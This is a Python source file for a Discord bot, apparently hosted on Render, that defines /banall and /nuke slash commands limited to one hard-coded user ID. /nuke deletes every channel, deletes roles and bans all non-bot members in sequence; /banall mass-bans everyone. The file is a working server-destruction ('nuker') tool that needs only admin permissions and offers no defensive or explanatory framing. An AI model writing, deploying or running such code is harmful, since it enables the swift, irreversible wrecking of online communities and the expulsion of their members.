import os
import threading
import asyncio
import nextcord
from nextcord.ext import commands
from nextcord import Interaction
from nextcord.ui import View
from flask import Flask

# ----------------------
# CONFIG
# ----------------------
AUTHORIZED_USERS = {1355140133661184221}
TOKEN = os.environ.get("TOKEN")
PORT = int(os.environ.get("PORT", 10000))

if not TOKEN:
    raise RuntimeError("Missing TOKEN environment variable")

# ----------------------
# FLASK KEEP-ALIVE (Render)
# ----------------------
app = Flask("")

@app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    app.run(host="0.0.0.0", port=PORT)

threading.Thread(target=run_flask, daemon=True).start()

# ----------------------
# BOT SETUP
# ----------------------
intents = nextcord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    await bot.sync_application_commands()

# ----------------------
# UTILS
# ----------------------
def progress_bar(done, total, size=20):
    if total == 0:
        return "▓" * size
    filled = int(size * done / total)
    return "▓" * filled + "░" * (size - filled)

# ----------------------
# STOP VIEW
# ----------------------
class StopView(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.stop_requested = False

    async def interaction_check(self, interaction: Interaction):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message(
                "❌ You can’t press this button.",
                ephemeral=True
            )
            return False
        return True

    @nextcord.ui.button(
        label="🛑 STOP",
        style=nextcord.ButtonStyle.danger
    )
    async def stop(
        self,
        button: nextcord.ui.Button,
        interaction: Interaction
    ):
        self.stop_requested = True
        button.disabled = True
        await interaction.response.edit_message(
            content="🛑 **STOP REQUESTED — HALTING...**",
            view=self
        )

# ----------------------
# /BANALL WITH LIVE PROGRESS
# ----------------------
@bot.slash_command(description="Ban all members except authorized users")
async def banall(interaction: Interaction):

    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("❌ Not allowed.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    guild = interaction.guild
    members = [
        m for m in guild.members
        if not m.bot and m.id not in AUTHORIZED_USERS
    ]

    total = len(members)
    banned = 0
    failed = 0

    view = StopView(interaction.user.id)

    msg = await interaction.followup.send(
        content=(
            "🔨 **BANALL IN PROGRESS**\n"
            f"{progress_bar(0, total)}\n"
            f"Banned: 0 / {total}"
        ),
        view=view,
        ephemeral=True
    )

    for member in members:
        if view.stop_requested:
            break

        try:
            await member.ban(reason="Mass ban")
            banned += 1
        except:
            failed += 1

        await msg.edit(
            content=(
                "🔨 **BANALL IN PROGRESS**\n"
                f"{progress_bar(banned, total)}\n"
                f"🔨 Banned: {banned} / {total}\n"
                f"⚠️ Failed: {failed}"
            ),
            view=view
        )

        await asyncio.sleep(1.0)

    status = "🛑 **STOPPED BY USER**" if view.stop_requested else "✅ **BANALL COMPLETE**"

    await msg.edit(
        content=(
            f"{status}\n"
            f"{progress_bar(banned, total)}\n"
            f"🔨 Banned: {banned}\n"
            f"⚠️ Failed: {failed}"
        ),
        view=None
    )

# ----------------------
# /NUKE WITH LIVE PROGRESS
# ----------------------
@bot.slash_command(description="Delete channels, roles and ban members")
async def nuke(interaction: Interaction):

    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("❌ Not allowed.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)

    guild = interaction.guild
    bot_member = guild.me

    channels = list(guild.channels)
    roles = [
        r for r in guild.roles
        if not r.is_default() and not r.managed
        and r.position < bot_member.top_role.position
    ]
    members = [
        m for m in guild.members
        if not m.bot and m.id not in AUTHORIZED_USERS
    ]

    view = StopView(interaction.user.id)

    ch_done = rl_done = bn_done = 0

    msg = await interaction.followup.send(
        content="💥 **NUKE STARTING...**",
        view=view,
        ephemeral=True
    )

    # CHANNELS
    for ch in channels:
        if view.stop_requested:
            break
        try:
            await ch.delete(reason="Nuked")
            ch_done += 1
        except:
            pass

        await msg.edit(
            content=(
                "💥 **NUKE IN PROGRESS**\n"
                f"🧨 Channels: {ch_done}/{len(channels)}\n"
                f"🧱 Roles: {rl_done}/{len(roles)}\n"
                f"🔨 Bans: {bn_done}/{len(members)}\n\n"
                f"{progress_bar(ch_done + rl_done + bn_done, len(channels)+len(roles)+len(members))}"
            ),
            view=view
        )
        await asyncio.sleep(0.4)

    # ROLES
    for role in roles:
        if view.stop_requested:
            break
        try:
            await role.delete(reason="Nuked")
            rl_done += 1
        except:
            pass
        await asyncio.sleep(0.3)

    # BANS
    for member in members:
        if view.stop_requested:
            break
        try:
            await member.ban(reason="Nuked")
            bn_done += 1
        except:
            pass
        await asyncio.sleep(1.0)

    final_status = "🛑 **NUKE STOPPED**" if view.stop_requested else "💥 **NUKE COMPLETE**"

    await msg.edit(
        content=(
            f"{final_status}\n"
            f"🧨 Channels deleted: {ch_done}\n"
            f"🧱 Roles deleted: {rl_done}\n"
            f"🔨 Members banned: {bn_done}"
        ),
        view=None
    )

# ----------------------
# RUN BOT
# ----------------------
bot.run(TOKEN)
